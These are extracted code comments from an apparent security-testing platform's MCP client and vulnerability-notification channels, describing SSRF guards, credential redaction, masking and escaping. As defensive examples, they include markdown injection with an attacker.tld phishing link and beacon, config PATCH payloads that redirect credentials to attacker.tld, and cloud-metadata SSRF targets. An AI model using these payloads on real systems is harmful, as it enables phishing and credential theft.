Comments.Text: // Package mcphttp contains remote Streamable HTTP and legacy SSE MCP clients.
// The core mcp package only speaks stdio; this adapts an HTTP/JSON-RPC MCP server
// to the same tool.CoreTool shape (mcp__server__tool) WITHOUT touching the SDK.
// It implements the MCP "Streamable HTTP" transport: JSON-RPC over HTTP POST, with
// the server free to answer either as application/json or a text/event-stream (SSE)
// carrying the response. Custom headers (e.g. Authorization) come from the MCP
// row's env map, so a bearer token is configured as {"Authorization":"Bearer …"}.
// ToolName mirrors mcp.ToolName so remote tools share the mcp__server__tool scheme.
// Client is a connection to one remote MCP server. New uses Streamable HTTP;
// NewSSE uses the legacy GET /sse + POST /message transport.
// legacySSE is the pre-2025 MCP SSE transport used by servers such as GSL5.
// New connects to a remote MCP endpoint and performs the initialize handshake.
// headers are sent on every request (Authorization, custom API keys, …).
// When insecure is true, TLS certificate verification is skipped so servers that
// present a self-signed certificate can still be reached (issue #108).
// NewSSE connects to the legacy MCP SSE transport: a long-lived GET /sse
// announces a per-session POST /message endpoint, while JSON-RPC responses are
// delivered asynchronously as SSE message events.
// the SSE stream is intentionally long-lived.
// Tools lists the server's tools and adapts them to CoreTools.
// Match built-in/custom tools: Capture truncates oversized output using the session
// MaxOutputChars (default 30000). With ToolOutputDir configured, spill the full output
// to disk and retain only the head plus a pointer, keeping large MCP results out of context.
// Call invokes one tool and returns the concatenated text of its content blocks
// (ScopeSentry answers with a single JSON text block). Unlike the CoreTool wrapper
// from Tools(), this bypasses the agent permission (AskUser) layer — it is meant
// for backend batch jobs (e.g. asset sync) that call MCP tools programmatically.
// Close terminates the MCP session best-effort (DELETE with the session id, per the
// Streamable HTTP spec). Servers that don't track sessions simply ignore it.
// --- JSON-RPC over Streamable HTTP ---
// roundTrip POSTs one JSON-RPC frame. When expectResp is false (a notification) the
// server replies 202 Accepted with no body. Otherwise the reply is parsed from JSON
// or from an SSE stream, whichever the server chose.
// Capture the session id the server assigns on initialize.
// notification — no JSON-RPC body to parse
// legacyRoundTrip posts to the endpoint announced by GET /sse. The HTTP POST
// only acknowledges receipt; the JSON-RPC response arrives on the SSE stream.
// Serializing calls keeps the first implementation deterministic while the
// shared SSE reader still handles asynchronous delivery.
// parseSSE reads an SSE stream and returns the first data frame that is a JSON-RPC
// response matching wantID (server-to-client requests/notifications are skipped).
// event boundary
// Channel adapts a notification channel. Implementations must be stateless: multiple channel
// configurations reuse one instance concurrently; all credentials come from cfg.
// Kind returns the channel kind identifier, which must match the registry key.
// Validate checks required fields and formats when saving configuration. Errors are shown directly to
// the administrator, so name the missing field rather than saying only that configuration is invalid.
// Send delivers one message and returns the number of items actually delivered and an error.
// Platforms limit message length; digests are truncated when the whole batch does not fit.
// If callers mark the entire batch delivered unconditionally, truncated items disappear from messages
// while delivery history reports success, hiding undelivered findings. With kept,
// callers mark only the first kept items delivered and leave the rest for the next batch.

Comments.Text: // dingTalkChannel implements a DingTalk custom bot.
// Platform constraints that shape this implementation:
//   - Each bot is limited to 20 messages/minute; excess messages may be silently dropped (even with HTTP 200),
//     so rate limiting must be client-side; see DefaultRatePerMin.
//   - Security supports signing, custom keywords, or an IP allowlist. Signing is the only option independent of
//     message content, so only signing is supported (as are bare webhooks with all three options disabled).
//   - Both success and failure return HTTP 200; inspect errcode in the body, or failed deliveries
//     will be recorded as successful.
// The DingTalk Webhook URL contains access_token and is itself a credential; mask it entirely.
// The destination is the DingTalk Webhook URL itself; changing it requires explicitly resupplying the signing key for the new URL.
// Send delivers one message. Use ActionCard with a button for a single item with a backlink; otherwise use markdown.
// DingTalk markdown has no explicit byte limit, but cap it defensively against oversized evidence fields.
// DingTalk embeds business errors in HTTP 200 responses.
// 301000 means signature verification failed; 310000 means keyword mismatch. Both are configuration errors
// that retries cannot repair.
// dingTalkSignedURL appends timestamp and sign to the webhook using the official signing rules.
// Rule: string to sign = timestamp + "\n" + secret; the HMAC-SHA256 **key is also secret**.
// Base64-encode the result, then URL-encode it. timestamp is in milliseconds. Return unchanged when secret is empty,
// to support bots without signing enabled.
// Do not pass err through: url.Parse error text includes the full URL, including access_token.
// validateHTTPURL checks URL validity and supported schemes, and checks literal IP destinations for internal addresses.
// Two important details:
//  1. **Errors must be redacted.** url.Parse returns *url.Error, whose Error() includes
//     **the complete original URL**. These providers embed credentials in URLs (DingTalk access_token,

//     delivery last_error records, server logs, and delivery-history responses.

Comments.Text: // emailDialTimeout / emailSessionTimeout bound connection establishment and the entire SMTP session, respectively.
// net/smtp has no timeout mechanism. Without these two bounds, a stalled peer can leave
// the delivery goroutine blocked forever. Since the dispatcher processes serially in one goroutine,
// that would stop the entire notification system.
// emailChannel implements SMTP email delivery.
// Email has no platform rate limit, but should not spam recipients; use a generous default.
// Mask only the password. SMTP host, account, and recipients are not secrets; masking them only complicates editing.
// host/port determine which server receives the password; tls determines transport encryption. Changing any of these
// requires explicitly resupplying the password, so disabling TLS also requires explicit credentials rather than an incidental edit.
// STARTTLS: upgrade when supported. Never send credentials in a plaintext session (see auth below).
// smtp.PlainAuth refuses to send credentials over an unencrypted connection unless the destination is localhost.
// This is **correct** security behavior and must not be bypassed, but explain the cause clearly;
// otherwise users see only "unencrypted connection" without knowing how to fix it.
// A failed Quit does not change the fact that the server accepted the message; ignore that error.
// Email is not truncated (the entire HTML body is sent); count the whole batch as delivered.
// emailDial establishes an SMTP connection.
// implicitTLS=true uses immediate TLS, as on port 465; false connects in plaintext on 25/587 and then uses
// STARTTLS. Do not mix them: a plaintext greeting to port 465 causes an immediate disconnect.
// Set the session deadline **at connection establishment**, not afterward: net/smtp.Client hides the underlying
// connection in an unexported field. Once handed over, the previously set deadline is the only
// fallback. It also covers blocking during the handshake.
// Control attaches blockInternalDial, sharing the HTTP channels' guard. Without it SMTP
// would leave an SSRF gap: host values such as 169.254.169.254 or 127.0.0.1 could connect directly,
// and smtp.NewClient handshake failures include the peer's response line in errors, which last_error
// exposes through delivery history, creating a semi-blind read primitive. Timing differences between refusal and timeout
// could also probe ports. Dial-time enforcement is final and also covers DNS rebinding.
// smtpStageError classifies a stage failure as retryable or permanent using the SMTP reply code.
// The distinction matters because SMTP 4xx and 5xx have entirely different semantics:
//   - 4xx (450 greylisting, 451 local error, 452 insufficient storage) are **temporary** refusals;
//     retry later. Greylisting in particular occurs on nearly every first delivery attempt.
//   - 5xx (550 unknown user, 553 invalid address) are permanent refusals; retrying is pointless.
// Classifying all failures as permanent would move **every** notification to failed on its first
// attempt against a greylisting server, precisely where automatic retries are most useful.
// Read the first three digits of the error text as the reply code; if unavailable, treat it as retryable
// (prefer an extra retry over permanently rejecting a potentially transient failure because parsing failed).
// smtpReplyCode extracts the leading three-digit reply code from SMTP error text, or returns 0 if absent.
// net/smtp exposes no error-code field, so parse text in the form "450 4.7.1 ...".
// buildEmailMessage assembles a complete RFC 5322 message.
// Base64-encode the body for two reasons: SMTP limits lines to 1000 bytes, while HTML
// bodies (especially batch emails) easily exceed that; base64 also never produces lines starting with ".",
// avoiding SMTP dot-stuffing concerns.
// Chinese subjects require RFC 2047 encoding, or clients display garbled text.
// Email has no hard length limit, so do not truncate the body.
// Wrap base64 at 76 characters per line, per RFC 2045.

Comments.Text: // Filter is the contract for notification_channels.filter, a JSONB column containing channel-instance filters.
// All fields are optional; omitted means no filtering, also the fallback for malformed configuration; see ParseFilter.
// MinSeverity is the minimum severity threshold (low/medium/high/critical); empty means no threshold.
// Empty TaskIDs / AssetIDs arrays mean unrestricted; otherwise the event must intersect them.
// Empty VulnClassInclude accepts all; otherwise vulnclass must match at least one keyword.
// VulnClassExclude rejects any keyword match (exclusion takes precedence over inclusion).
// Matching uses case-insensitive substrings, safer than regex: invalid user regex cannot silently disable the channel.
// OnStatusChange controls whether the channel receives vulnerability status-change events (meaningful only in realtime mode).
// ParseFilter parses channel filter configuration.
// **Never returns an error.** This is deliberate: malformed filter configuration falls back to a zero-value
// Filter (= no filtering = match all), because in a vulnerability notification system **an extra notification is better than
// silently missing a critical one**. Treating parse failure as no delivery gives users a channel that looks configured
// but sends nothing, the worst failure mode.
// On parse failure, f remains zero-valued, meaning no filtering.
// ValidMinSeverity reports whether s is a valid severity threshold (empty means no threshold).
// Validate checks fields with **restricted values** when saving a channel.
// Why reject at write time: Match evaluates unknown thresholds as `rank >= 0`, always true;
// thus a typo in min_severity ("hgih") **silently disables filtering** and
// pushes everything. This aligns with the package's preference for extra delivery over missed delivery,
// but users believe severity filtering is active while every vulnerability floods the group,
// with no indication of misconfiguration. Reject such silent degradation at the input boundary.
// Validate is used **only for writes**. Reads retain ParseFilter's tolerant semantics,
// so existing invalid values do not prevent loading the entire channel.
// Match decides whether an event should be delivered to a channel with this filter.
// **Never returns an error**, for the same reason as ParseFilter: internal anomalies count as matches.
// Evaluation order: event type -> severity threshold -> task/asset scope -> vulnerability-class keywords.
// Only explicitly enabled channels receive status-change events. Disabled by default because most users
// expect notifications about newly discovered vulnerabilities, not a log of every status transition.
// Exclusion first: any excluded keyword rejects the event even if it also matches the include list.
// Linear scans suffice for these small sets, each typically a few dozen manually selected values;
// building a map costs more than it saves.
// containsAnyFold reports whether s contains any keyword, case-insensitively.

Comments.Text: // allowLocalTargets controls delivery to loopback / link-local addresses.
// Denied by default. IM bots and public mail servers should not use these ranges, while they can reach
// sensitive destinations: management ports of colocated services and cloud metadata endpoints
// (169.254.169.254, which can expose instance credentials). Administrators configure delivery URLs, but XSS/CSRF
// hijacking an admin session, or another person sharing the JWT, could alter configuration to read responses:
// doJSON stores the first 200 response-body bytes from 4xx/5xx responses in last_error, and delivery history
// echoes it back, providing a semi-blind read primitive.
// However, a local SMTP relay (postfix on 127.0.0.1:25) is common for self-hosted mail,
// so a blanket ban would block legitimate users. Provide an explicit escape hatch rather than hardcoded access:
// set ARTEX_NOTIFY_ALLOW_LOCAL=1 to allow it.
// Export AllowLocalTargetsEnv so tests can explicitly enable this: tests in this package and server
// frequently use httptest receivers on 127.0.0.1, which the guard otherwise blocks.
// isBlockedDialIP reports whether a destination IP is in a range denied for delivery by default.
// Reject only loopback, link-local (including cloud metadata 169.254.169.254), unspecified, and multicast addresses.
// **Do not reject** RFC1918 private networks: internal Mattermost / SMTP relays are common legitimate deployments;
// blocking them would make the feature unusable in real environments. This tradeoff is deliberate:
// block genuinely sensitive destinations without disabling normal deployments.
// Unmap IPv4-mapped IPv6 (::ffff:127.0.0.1) before checking, or it can bypass validation.
// blockInternalDial is the http.Transport dialer's Control hook; it checks the destination
// **when establishing the connection**.
// Why enforce at dial time rather than only when saving configuration: this is the final enforcement point.
// It covers two ways around configuration validation: DNS rebinding (resolving to a public IP at validation,
// then an internal IP at connection time) and redirects (cross-host redirects are already denied, but same-host redirects
// may still target another path).
// notifyTransport adds only a dial guard to the default Transport.
// Clone preserves all default tuning (connection pooling, HTTP/2, timeouts, proxy, etc.),
// avoiding unrelated behavior changes just to add one check.
// httpClient is shared by all channel deliveries.
// Deliberately **do not** reuse the project's global outbound proxy (GlobalProxy on the server side): it carries penetration
// test target traffic, often through unstable tunnels. Notification availability must not depend on target-network instability.
// IM notifications connect directly. Use a 15-second timeout; a slower peer is effectively failing.
// Reject cross-host redirects: delivery URLs are fixed endpoints and normally do not
// redirect to another host. Provider credentials (DingTalk access_token, WeCom key, Telegram
// bot token) are **in the URL**, so following cross-host redirects hands them to the destination. Same-host
// redirects, such as adding a trailing slash, remain allowed.
// respBodyLimit bounds response-body reads. A malfunctioning peer may return huge content; we need only
// an error code and a short description for delivery history.
// doJSON sends one request and returns the bounded response body.
// A nil payload sends an empty body (for GET or platforms requiring no body).
// headers are appended unchanged for generic Webhook custom headers.
// Error classification is central: network failures and 5xx/408/429 are retryable;
// other 4xx are permanent. Retrying a 403 merely logs the same error three times.
// Serialization failure is a local bug (incorrect configuration field type); retries cannot repair it.
// An invalid URL is usually a user input mistake and is a permanent failure.
// Again, do not pass err through: url.Parse errors include the complete URL.
// Connection refusal, DNS failure, and timeouts are usually transient; retry with backoff.
// Redact error text before exposing it. http.Client.Do returns *url.Error,
// whose Error() is `Op "complete URL": underlying error`; provider credentials are **in the URL**
// (DingTalk access_token, WeCom key, Feishu hook id, Telegram /bot<token>/).
// Without redaction, credentials flow to four places: notification_deliveries
// last_error (plaintext storage), delivery-history responses (**bypassing channel configuration masking**),
// server logs, and the test-send endpoint's 502 text returned to the frontend.
// 429 (rate limiting) and 408 (timeout) merit retries; other 4xx indicate configuration or permission errors.
// snippet compresses a response body to a short single line for error messages. Responses may contain newlines and whitespace;
// putting them directly in last_error would break delivery-history layout.
// redactRequestTarget reduces delivery URLs to "scheme://host/…" for error messages.
// This is the package's sole URL-redaction policy, deliberately **coarse**: retain only scheme and host,
// discard everything else. There is no universal safe way to identify which URL component is a credential:
//	DingTalk credentials in query      /robot/send?access_token=xxx
//	WeCom credentials in query         /cgi-bin/webhook/send?key=xxx
//	Feishu credentials in **last path segment** /open-apis/bot/v2/hook/<hook_id>
//	Telegram credentials in **middle path segment** /bot<token>/sendMessage
// Keeping only useful parts would require channel-specific patches; missing any provider would leak credentials.
// The host suffices for troubleshooting DNS, connection, and certificate problems;
// identify the specific bot using the masked suffix in channel configuration.
// Return a fixed placeholder on parse failure; never echo the original string.
// redactTransportError removes URLs from transport errors, preserving only the underlying cause.
// *url.Error has {Op, URL, Err}; its Error() prints the URL too.
// Explicitly extract Err to bypass Error(), which is more reliable than subsequent string replacement:
// replacement must handle all URL-encoded and escaped variants and can miss some.
// Non-*url.Error values (such as redirect-policy errors) may also contain URLs; redact them consistently.
// redactURLsInText replaces http(s) URLs in text with redacted forms.
// This is a fallback for errors without structured fields (redirect-policy errors and custom third-party errors).
// Recognize only http/https prefixes; split at whitespace and quotes, which cannot occur in URLs.

Comments.Text: // Shared message rendering for Markdown-based channels (DingTalk and WeCom).
// Feishu uses card JSON; Telegram and email use HTML, rendered in their adapters.
// maxAssetsShown limits displayed assets. A vulnerability can anchor dozens of assets;
// listing all would overflow the message without adding value. Few readers inspect domains beyond the fourth in IM.
// maxSummaryRunes limits summary length. IM messages prompt readers to view details;
// they are not the report itself. Full content lives on the platform.
// markdownReservedBytes reserves room for the header (batch summary, severity distribution, and possible truncation notice)
// and footer (platform link). Deduct this from the whole-item packing budget to prevent truncation of either;
// otherwise readers cannot identify the batch or how many items are missing.
// markdownEscape escapes markdown metacharacters.
// Why this is necessary: vulnerability title, summary, class, and asset display name all come from **untrusted sources**.
// Titles and summaries come from model output informed by target responses; asset URLs are full scanned
// URLs, including target-controlled query strings. Without escaping, a title such as
//	Login SQL injection\n[Urgent: verify your account here](http://attacker.tld)
// would render as a **clickable external link** in the security engineer's DingTalk/Feishu client;
// `![](http://attacker.tld/beacon)` is fetched by the client during rendering, indicating
// that the vulnerability was viewed and exposing the reader's IP. Even benign injected bold text or
// blockquotes can push serious vulnerabilities below the fold.
// The escape set covers headings, links, emphasis, lists, blockquotes, and strikethrough: characters that change structure or create clickable
// elements. Process `\` first to avoid escaping newly inserted backslashes again.
// markdownText compresses untrusted text to one line and escapes it for markdown bodies.
// Single-line conversion complements escaping: newlines alone can forge list items or blockquotes,
// which character escaping cannot stop.
// markdownTitle returns the message title (IM title bar/card title) as **unescaped original text**.
// Deliberately do not escape here: this title is shared across rendering contexts: markdown bodies, Telegram
// HTML, Feishu card plain_text, generic Webhook JSON, and email subjects. Each context has
// different escaping rules (markdown escapes leave visible backslashes in HTML and contaminate JSON
// data), so each output sink must perform its own escaping; see writeItem / feishuItemLines /
// telegramEscape. Previously adding markdown escaping in the shared function caused Telegram messages
// to show literal backslashes such as `\(1\)`.
// markdownBody renders the message body and returns it with **the number of items actually included**.
// kept counts items actually delivered. Callers mark only the first kept entries
// delivered; entries excluded by channel limits must remain for the next batch, not be
// marked successful. Otherwise truncation causes silent loss: delivery records claim all items succeeded,
// with no indication that the latter part was never sent.
// maxBytes<=0 means unlimited.
// Send even an oversized single item, with final truncation as fallback: partial vulnerability information
// is better than no notification.
// markdownBatchIntro renders the batch introduction: time window, item count, and severity distribution.
// This lets recipients decide whether immediate action is needed without opening the platform.
// items are **actually included** entries; total is the intended batch size. If they differ, explicitly state
// how many continue in the next message; otherwise readers assume the header count covers everything,
// while unsent items are entirely absent from the interface.
// Show severity distribution so readers can spot serious entries. Count only entries **actually included**
// in this message so the critical count matches the entries visible below.
// writeItem renders one vulnerability entry.

Comments.Text: // MaskedPrefix marks masked values. API responses replace credentials with values carrying this prefix;
// update requests interpret such values as keeping the stored value unchanged.
// A prefix, rather than an empty string or fixed constant, also allows some identifying information
// (see MaskedValue), letting users recognize the bot without repasting its key.
// MaskedValue generates a masked value:
//	"__masked__"              Original too short; provide no hint.
//	"__masked__:…ab12cd"      Include the last 6 characters as an identifying hint.
// Exposing only the final 6 characters is deliberate: Webhook identifiers occur near the end (WeCom key,
// Feishu bot id), whereas prefixes are shared and unhelpful. Six characters cannot reconstruct
// the credential but suffice for the configurator to recognize the group.
// IsMasked reports whether a value is masked (returned by the API and left unchanged).
// MaskConfig copies configuration, replacing channel credential fields with masked values.
// Unknown channel types return an empty map, not the original configuration; prefer an unavailable configuration UI
// o exposing raw content that may contain credentials when the channel type is unrecognized.
// Preserve noncredential fields unchanged so the UI can display them.
// Treat nested structures such as headers as one credential: inspecting subkeys would require each channel
// to declare another set of credential-subkey rules, with complexity exceeding the benefit.
// ErrDestinationChangedWithoutCredentials means the destination changed without explicit input for
// credential fields. Return it rather than silently allowing the change or dropping credentials; see PrepareConfigUpdate.
// Changed destination keys
// Credential keys not explicitly supplied
// PrepareConfigUpdate merges channel configuration and handles security-sensitive destination changes.
// It replaces bare MergeConfig in channel updates to block this verified attack path:
// destination and credentials are independent fields, while MergeConfig preserves stored values
// for omitted keys. Anyone able to PATCH a channel could **change only the destination,
// omitting credentials**, causing the server to send stored credentials to an attacker-controlled endpoint:
//	webhook  {config:{url:"https://attacker.tld"}}  -> original Authorization header sent externally
//	telegram {config:{base_url:"https://attacker.tld"}} -> /bot<真Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    -> username and password sent after STARTTLS
// This is entirely silent and needs no redirect, so denying cross-host redirects does not stop it;
// it directly defeats masking's goal of never returning credentials to the browser.
// Rule: whenever a destination key changes, callers must explicitly address **every** credential key:
//   - Supply a new value -> use it.
//   - Explicitly supply an empty string -> no credential needed for this field (preserve clearing semantics).
//   - Return the masked value unchanged or omit the key -> reject.
// The third case is rejected because a masked value means reusing the old credential, which
// belongs only to the old destination. Deliberately do not automatically discard credentials: optional fields
// (webhook headers, email password) would silently lose authentication while returning 200,
// making diagnosis harder than an error. Prefer requiring explicit re-entry.

Comments.Text: // This file tests the invariant that **no** error text from channel implementations may contain credentials.
// Why a separate file: initial channel tests covered only success and platform business errors,
// not transport failures, which are the most dangerous (connection refusal / DNS failure / timeout).
// http.Client.Do returns *url.Error including the **complete URL**, while provider
// credentials are in that URL. The error exposed credentials through four outlets:
//	notification_deliveries.last_error -> plaintext storage.
//	GET /api/notify/deliveries responses -> bypass configuration masking and echo to the browser.
//	Server logs -> often forwarded for retention.
//	Test-send endpoint 502 responses -> displayed directly in the frontend.
// Rather than testing only one function, each channel makes a real request guaranteed to fail; assert that error text
// does not contain the credential.
// credentialCases covers all channel shapes with credentials in URLs:
// DingTalk/WeCom in query, Feishu in the final path segment, Telegram in the middle path segment.
// leakProbeToken is a sentinel that cannot be a real credential, searched for in error text.
// TestChannelErrorsNeverLeakCredentials is the core invariant.
// Guaranteed-failure peer: nothing listens on 127.0.0.1:1, exercising connection refusal.
// TestChannelErrorsNeverLeakCredentialsInPermanentPath covers permanent failures:
// URL validation and platform business errors also expose text and must not contain credentials.
// Credential-bearing but malformed URL -> exercise validateHTTPURL / url.Parse.
// The redacted result must contain no original path/query fragments.
// Never echo the original unparseable input.
// TestRedactTransportErrorStripsURL directly checks *url.Error:
// it is the return type from http.Client.Do and the original source of the leak.
// Preserve Op too (POST versus GET helps diagnosis).
// TestRedactURLsInTextHandlesFallback covers non-*url.Error custom errors:
// URLs in redirect-policy errors and similar errors must also be removed.
// Preserve text without URLs unchanged.
// TestCrossHostRedirectRefused covers credentials in URLs plus cross-host redirects exposing those credentials.
// Two httptest servers use different 127.0.0.1 ports; different ports mean different Host values,
// which constitutes a cross-host redirect.
// TestSameHostRedirectAllowed is the inverse: same-host redirects, such as adding a slash, must remain usable,
// or normal workflows would also be blocked.
// Redirect on the same host and port.
// TruncateBytes truncates s to at most max bytes, preserving valid UTF-8 and whole characters.
// Why character boundaries matter: WeCom group bot markdown has a hard 4096 **byte** limit, not
// a character limit; Chinese characters take 3 bytes. Direct byte slicing can split a character and produce invalid
// UTF-8, causing rejection or garbled squares. Starting at the budget position,
// backtrack to the nearest rune start (utf8.RuneStart identifies continuation bytes 0b10xxxxxx).
// max<=0 means unlimited. Append an ellipsis after truncation unless max cannot fit it.
// If max is shorter than the ellipsis, omit it and truncate directly to avoid exceeding max.
// OneLine compresses multiline text to a single line: collapse all whitespace, then truncate by character count.
// Used for IM title lines; summaries often contain newlines that would disrupt tables or titles.
// max<=0 means no length limit.
// TruncateRunes truncates s to at most max characters, not bytes, appending an ellipsis when exceeded.
// max<=0 means unlimited.
// Unlike TruncateBytes, this follows platform character limits: WeCom counts bytes, Telegram counts characters.
// Using the wrong unit causes no error, only unexpectedly short messages (one Chinese character takes 3 bytes;
// a 4096-byte cut retains about 1365 characters), so retain both functions and select by channel.
// TruncateHTML truncates an HTML fragment by character count without leaving partial tags.
// Direct character truncation can produce a partial tag such as `<a href="htt`; the platform parser may
// reject the whole message or swallow following text as an attribute. First truncate by characters,
// then check for an unclosed trailing `<` and backtrack before it.
// Do not balance tags (such as adding ): Telegram's HTML parser closes open tags automatically;
// implementing balancing would require handling quoted attributes, comments, and self-closing tags for little benefit.
// If the tail starts with a partial `<` (no `>` after the last `<`), backtrack before it.
// Likewise, backtrack before a partial HTML entity (such as `&` cut to `&amp`).
// An entity-only parser may reject the **entire message** for a partial entity. Oversized
// batch messages are common and should not cause the whole notification to be lost.
// packItemCount calculates how many **whole** items fit the budget for batch-message packing.
// Why pack whole items instead of rendering everything then truncating: truncation makes later entries disappear,
// while delivery records still mark them delivered. Neither the message nor history reveals the loss,
// so vulnerabilities silently vanish. Whole-item packing keeps excluded entries in the database for the next batch;
// kept tells the caller how many items this message actually delivered.
// Parameters: maxSize<=0 means unlimited; reserve allows for message headers and footers;
// size supplies platform-specific measurement (WeCom/DingTalk count bytes, Telegram counts characters;
// using the wrong unit silently compresses Chinese messages far below the limit);
// render produces the actual text of item idx, whose content-dependent length cannot be estimated.
// Return at least 1 when items remain. Even an extremely long single item must be sent, relying on the caller's
// final truncation, or it could block the entire batch forever.
// byteSize / runeSize name packItemCount's measurement units, avoiding anonymous
// func(s string) int closures that obscure which unit the call uses.
// assetLine renders assets as one display line, omitting those beyond limit and showing the total count.
// One vulnerability may anchor dozens of assets; listing all would overflow the message.
// itoa is a short alias for strconv.Itoa, used only in display text to avoid importing strconv everywhere.

// telegramChannel implements the Telegram Bot API.
// Platform characteristics:
//   - Authentication is entirely in the URL path (/bot<token>/sendMessage); no signing needed.
//   - Use HTML parse mode rather than MarkdownV2: MarkdownV2 requires escaping `_*[]()~`>#+-=|{}.!`
//     (18 characters); missing one rejects the whole message. HTML needs only & < > escaped.
//   - Business errors also appear in HTTP 200 responses; inspect ok.
// Telegram allows about 1 message/second in private chats and 20/minute in groups. Use a conservative value.
// Bot Token is the complete credential; chat_id is only a recipient, not a secret (without a Token it cannot send messages).
// base_url determines which API endpoint receives the Token (such as a self-hosted reverse proxy); changing it requires explicit Token input.
// 429 is rate limiting and can be retried after backoff; others (400 invalid parameters, 401 invalid token, 403 blocked,
// 404 missing chat) are configuration errors that retries cannot repair.
// telegramEndpoint constructs the sendMessage URL. Empty base_url uses the official API;
// nonempty supports self-hosted Bot API reverse proxies, common on domestic networks.
// Do not pass err through: the URL contains the Bot Token, and even addr must not be echoed here.
// telegramHTML renders the HTML body and returns it with the number of entries actually included (see Channel.Send).
// Telegram limits **characters**, so packing also measures characters (runeSize).
// telegramReservedRunes reserves characters for the message title and possible truncation notice.
// telegramBatchLine renders one batch entry, unescaped; the caller escapes it consistently.
// telegramBatchTitle renders the batch title line. Count entries **actually included in this message**,
// not the batch total, or readers will assume the header number covers everything.
// telegramEscape escapes HTML text content.
// Telegram recognizes only these three entities. Existing entities such as & are escaped again, deliberately:
// we want to display original characters, not allow HTML injection.
// telegramEscapeAttr escapes HTML attribute values, handling quotes in addition to text escaping:
// quotes in URLs could prematurely close href and turn subsequent content into an injection point.

Comments.Text: // webhookChannel is a generic Webhook adapter with user-defined URL, method, headers, and JSON template.
// It avoids separate implementations for Slack / Mattermost / Discord / self-hosted systems;
// one configurable template can cover all of them.
// Generic Webhooks have no official limit; return 0 for unlimited by default, leaving users to match peer capacity.
// Mask url and headers: destinations often contain tokens and custom headers usually contain credentials;
// both appear in API responses and must be protected.
// Editing one header consequently requires resubmitting all headers (masked values mean keep unchanged).
// This tradeoff is deliberate: prefer re-entry over exposing credentials to the browser.
// The destination is url. Changing url requires explicit headers input, or the original Authorization header
// would be sent unchanged to the new destination, the primary masking-bypass path.
// webhookDefaultTemplate is the fallback request body when no template is provided: straightforward JSON
// covering most self-hosted receivers that store incoming JSON.
// webhookTemplateData is the context exposed to user templates.
// SentAt is this delivery's timestamp (RFC3339), for receiver records.
// StatusLabel describes a status transition, such as pending -> fixed; empty for other events.
// GET has no body. Adding content to query parameters exceeds template capabilities and conflicts with GET semantics,
// so GET suits only receivers triggered by an endpoint hit.
// The template renders JSON text; convert it to json.RawMessage and send unchanged,
// avoiding double escaping that would wrap the intended structure in a JSON string.
// Allow overrides, but apply after headers so explicit configuration takes precedence.
// Generic Webhooks do not truncate bodies (the receiver is user-controlled and body_template determines size),
// so the entire batch counts as delivered.
// renderWebhookBody renders the request body using the user template or default template.
// parseWebhookTemplate parses the template.
// missingkey=zero renders absent map keys as zero values rather than errors. This context is a struct;
// its main purpose is to avoid range errors when .Items is empty. The actual concern is nil .Items.
// webhookTemplateFuncs supplies helper functions exposed to templates.
// json serializes any value as JSON.
// This function is essential, not cosmetic: without it users can only interpolate {{.Title}} directly;
// a quote or newline in a vulnerability title then makes the entire request invalid JSON. The receiver
// rejects it with a JSON parse error, offering no obvious clue that a title quote caused the problem.
// jsons embeds a JSON fragment inside another JSON string value, applying one layer of string escaping.
// Remove outer quotes; callers decide whether to add them.

Comments.Text: // This file locks down the generic Webhook template's **capability boundary**.
// This is the package's only place evaluating user-supplied strings as code, so specify what templates can
// and cannot do, and enforce those properties with tests. Otherwise adding a context
// method or a readFile FuncMap function could silently expand capabilities while the diff
// looks like a harmless helper.
// TestTemplateContextHasNoMethods is the most important assertion.
// text/template invokes exported methods ({{.Foo}} accesses fields or calls methods). Thus any
// reachable type with exported methods exposes those methods to template authors.
// This context deliberately contains only plain data: exported fields and no methods.
// Failure means a method was added to webhookTemplateData / webhookItem.
// Before permitting it, consider whether templates could use it to read unintended data.
// TestTemplateFuncsAreMinimal locks down the exposed function set.
// Every FuncMap entry adds a capability. Currently only json / jsons serialize values
// to JSON fragments: no file access, requests, or command execution.
// TestTemplateCannotReachUnknownData covers out-of-bounds template access:
// accessing nonexistent data must fail rather than echo anything; errors must not expose internal data.
// Errors must not include actual context content such as vulnerability titles/summaries.
// TestTemplateRenderFailsPermanently: malformed templates are configuration errors, not repairable by retry.
// If retryable, each delivery with a bad template wastes three backoff rounds.
// Even direct delivery bypassing validation must classify this as permanent, not repeatedly retry.
// TestTemplateCanOnlyProduceJSON enforces valid JSON template output.
// It also prevents generating plaintext to trigger other protocols.
// Valid templates pass.
// Reject non-JSON output rather than sending it unchanged.
// weComMarkdownLimit is the WeCom group bot markdown content hard limit in bytes, not characters.
// It is the strictest limit among all six channels and the primary reason for TruncateBytes.
// weComChannel implements WeCom group bots.
// Platform characteristics:
//   - Authentication uses only the URL key; signing is unsupported, so the webhook URL is the entire credential.
//   - markdown content is limited to 4096 **bytes**; oversized messages are rejected, not truncated. Chinese uses 3 bytes per character,
//     leaving room for only a little over a thousand characters; client-side truncation is required.
//   - Rate limit is 20 messages/minute, also enforced client-side.
// WeCom has only one credential: the Webhook URL key. Signing is unsupported;
// the entire URL is the credential and no other fields need masking.
// WeCom's sole Webhook field is both destination and credential, so no old credential remains after changing the URL.
// Batch messages can be long (50 one-line items plus prefix), easily exceeding 4096 bytes.
// Truncate here rather than relying on platform rejection: rejection loses the whole batch, while truncation delivers some entries.
// 45009 means the API limit was exceeded. The platform's rate window rolls, so retry after backoff can work;
// classify it explicitly as retryable. Reaching this means client rate_per_min is too aggressive;
// retrying is only a fallback. The real fix is lowering this channel's rate limit.
// 93000 means an invalid webhook key: permanent failure, not repairable by retry.

Comments.Text: // smokeEnv makes subprocesses started by smoke tests skip Bootstrap directly.
// Strictly, omission would be harmless: os.Executable() is artex.new in the child, so all derived
// paths carry the .new prefix and cannot touch actual update files. Relying on this coincidence is fragile;
// an explicit short circuit is clear and avoids a needless filesystem probe in the child.
// Action is Bootstrap's instruction to main.
// Continue: start the server normally.
// Restart: exit immediately with ExitRestart so the supervisor script relaunches the process.
// State describes update status at this startup so /api/update/check can accurately tell the frontend
// whether the last update succeeded or was rolled back.
// Not yet confirmed stable after replacement
// Automatic rollback performed during this startup
// Staged binary failed verification/smoke test and was discarded
// One-line user-facing explanation
// Bootstrap runs at the very start of main, before listening on any port or opening a database.
// Three cases:
//  1. Staged artex.new exists -> verify and smoke-test; swap and request restart on success, otherwise discard and keep the old version.
//  2. Only the marker remains -> swap just completed; count an attempt and roll back after enough consecutive failures.
//  3. Neither exists -> normal startup.
// applyStaged handles a staged binary: swap after successful verification, otherwise discard it.
